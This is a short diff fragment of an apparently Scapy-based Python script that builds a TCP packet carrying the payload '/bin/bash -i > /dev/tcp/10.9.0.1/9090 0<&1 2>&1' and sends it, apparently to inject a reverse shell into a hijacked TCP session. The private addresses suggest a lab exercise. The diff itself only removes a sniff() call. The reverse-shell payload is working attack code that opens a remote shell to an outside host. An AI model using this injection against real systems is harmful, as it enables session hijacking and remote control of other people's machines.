@@ -7,4 +7,3 @@ data = "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\r"
 pkt = ip/tcp/data
 ls(pkt)
 send(pkt, verbose=0)
-sniff()
